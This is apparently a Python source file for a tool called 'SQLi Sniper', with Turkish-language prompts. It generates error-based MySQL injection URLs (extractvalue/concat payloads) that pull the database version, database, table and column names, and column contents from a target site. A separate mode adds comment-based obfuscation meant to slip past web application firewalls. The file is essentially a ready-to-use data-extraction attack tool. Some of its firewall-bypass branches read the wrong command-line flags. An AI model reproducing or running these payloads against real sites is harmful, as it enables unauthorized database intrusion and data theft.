import os
import sys

def wafbypass():
    if '--vbyp' in sys.argv:
        knm = sys.argv.index('--vbyp') + 1
        print(f"URL: {sys.argv[knm]}and extractvalue(0x0a,/*!50000concat*/(0x0a,(select version())))--+-")
    if '--dbsbyp' in sys.argv:
        knm = sys.argv.index('--dbs') + 1
        print(f"URL: {sys.argv[knm]}and extractvalue(0x0a,/*!50000concat*/(0x0a,(select database())))--+-")
    if '--tblbyp' in sys.argv:
        knm = sys.argv.index('--tbl') + 1
        print("Kaç Tablonun Görünmesini İstiyorsun ?")
        kt = int(input("Yaz:")) - 1
        for urls in range(kt):
            print(f'URL: {sys.argv[knm]}and extractvalue(0x0a,/*!50000concat*/(0x0a,(select table_name from information_schema.tables where /*!50000table_schema*/=database() limit {urls},1)))--+-')
    if '--rtbyp' in sys.argv:
        knm = sys.argv.index('--rt') + 1
        print("Tablonun Kaç Tane Kolonunun Görünmesini İstiyorsun ?")
        kt = int(input("Yaz:")) - 1
        dbs = input("Database Adını Gir:")
        datb = dbs.encode("utf-8").hex()
        tbl = input("Tablo Adı:")
        table = tbl.encode("utf-8")
        tab = table.hex()
        for url in range(kt):
            print(f"URL: {sys.argv[knm]}and extractvalue(0x0a,/*!50000concat*/(0x0a,(select column_name from information_schema.columns where /*!50000table_schema*/=0x{datb} and table_name=0x{tab} limit {url},1)))--+-")
    if '--databyp' in sys.argv:
        knm = sys.argv.index('--data') + 1
        print("Kolonun İçeriğinin Ne Kadarının Görünmesini İstiyorsun")
        kt = int(input("Yaz:"))
        dbs = input("Database Adı Girin:")
        tbl = input("Tablo Adı Girin:")
        kln = input("Kolon Adı Girin:")
        for url in range(kt):
            print(f'URL: {sys.argv[knm]}and extractvalue(0x0a,/*!50000concat*/(0x0a,(select /*!50000concat*/({kln}) from {dbs}.{tbl} limit {url},1)))--+-')
try:    
    if '-v' in sys.argv:
        print("SQLi Sniper Version 0.3")
    if '-h' in sys.argv:
        print("SQLi Sniper Kullanımını TurkHackTeam Forum Sitesinde MuhammedTr768'in\nKonusunda Bulabilirsiniz")
    if '--v' in sys.argv:
        knm = sys.argv.index('--v') + 1
        print(f"URL: {sys.argv[knm]}and extractvalue(0x0a,concat(0x0a,(select version())))--+-")
    if '--dbs' in sys.argv:
        knm = sys.argv.index('--dbs') + 1
        print(f"URL: {sys.argv[knm]}and extractvalue(0x0a,concat(0x0a,(select database())))--+-")
    if '--tbl' in sys.argv:
        knm = sys.argv.index('--tbl') + 1
        print("Kaç Tablonun Görünmesini İstiyorsun ?")
        kt = int(input("Yaz:")) - 1
        for urls in range(kt):
            print(f'URL: {sys.argv[knm]}and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit {urls},1)))--+-')
    if '--rt' in sys.argv:
        knm = sys.argv.index('--rt') + 1
        print("Tablonun Kaç Tane Kolonunun Görünmesini İstiyorsun ?")
        kt = int(input("Yaz:")) - 1
        dbs = input("Database Adını Gir:")
        datb = dbs.encode("utf-8").hex()
        tbl = input("Tablo Adı:")
        table = tbl.encode("utf-8")
        tab = table.hex()
        for url in range(kt):
            print(f"URL: {sys.argv[knm]}and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_schema=0x{datb} and table_name=0x{tab} limit {url},1)))--+-")
    if '--data' in sys.argv:
        knm = sys.argv.index('--data') + 1
        print("Kolonun İçeriğinin Ne Kadarının Görünmesini İstiyorsun")
        kt = int(input("Yaz:"))
        dbs = input("Database Adı Girin:")
        tbl = input("Tablo Adı Girin:")
        kln = input("Kolon Adı Girin:")
        for url in range(kt):
            print(f'URL: {sys.argv[knm]}and extractvalue(0x0a,concat(0x0a,(select concat({kln}) from {dbs}.{tbl} limit {url},1)))--+-')
    if '--wbp' in sys.argv:
        wafbypass()
except:
    pass
        

        
        
        
        
        
        
